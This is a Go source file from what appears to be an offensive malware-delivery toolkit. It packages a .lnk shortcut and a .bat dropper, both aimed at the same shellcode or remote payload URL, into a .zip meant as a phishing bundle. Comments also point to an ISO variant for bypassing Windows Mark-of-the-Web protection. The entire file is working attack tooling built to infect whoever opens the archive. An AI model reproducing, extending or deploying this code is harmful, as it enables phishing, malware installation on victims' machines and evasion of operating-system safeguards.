// zip.go — emit a .zip that packages a .lnk + a .bat pointing at the same
// shellcode/url: the simplest "combine" format, where one archive delivers
// both a double-click shortcut and a runnable dropper. The inner artifacts are
// built by delegating to the lnk and bat emitters with the same Spec (no stager
// duplication) and packed with the stdlib archive/zip writer.
//
// A .zip is a phishing-bundle convenience; it does NOT bypass Mark-of-the-Web
// (extracted files inherit MOTW). Use -f iso for MOTW bypass via mount.
package delivery

import (
	"archive/zip"
	"bytes"
)

type zipEmitter struct{}

func (zipEmitter) Name() string { return "zip" }
func (zipEmitter) Ext() string  { return "zip" }

func (zipEmitter) Emit(s *Spec) ([]Artifact, error) {
	if len(s.Shellcode) == 0 && !s.Remote() {
		return nil, errPayloadRequired("zip")
	}
	inner, err := comboInner(s)
	if err != nil {
		return nil, err
	}
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, a := range inner {
		fw, err := zw.Create(a.Path) // a.Path is the basename, e.g. "payload.lnk"
		if err != nil {
			return nil, err
		}
		if _, err := fw.Write(a.Bytes); err != nil {
			return nil, err
		}
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return []Artifact{writeFile("payload.zip", buf.Bytes())}, nil
}

// comboInner builds the inner .lnk + .bat artifacts shared by the combine
// emitters (zip, iso) by delegating to their emitters with the same Spec, so
// the two packaged files always point at the same shellcode/url.
func comboInner(s *Spec) ([]Artifact, error) {
	var out []Artifact
	for _, e := range []Emitter{lnkEmitter{}, batEmitter{}} {
		arts, err := e.Emit(s)
		if err != nil {
			return nil, err
		}
		out = append(out, arts...)
	}
	return out, nil
}
